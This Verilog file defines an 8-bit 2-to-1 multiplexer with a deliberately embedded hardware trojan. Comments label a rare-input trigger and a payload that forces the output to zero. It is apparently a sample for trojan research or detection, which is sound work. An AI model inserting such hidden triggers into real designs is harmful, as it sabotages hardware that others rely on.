module mux2x8(input sel, input [7:0] a, input [7:0] b, output [7:0] y);
  wire trigger;
  // Trigger fires when sel=1, a=8'hA5, b=8'h5A (rare exact wide-bit match)
  assign trigger = sel & (a == 8'hA5) & (b == 8'h5A);
  // Payload: when triggered, force y to all-zeros (degraded output) instead of b
  assign y = trigger ? 8'h00 : (sel ? b : a);
endmodule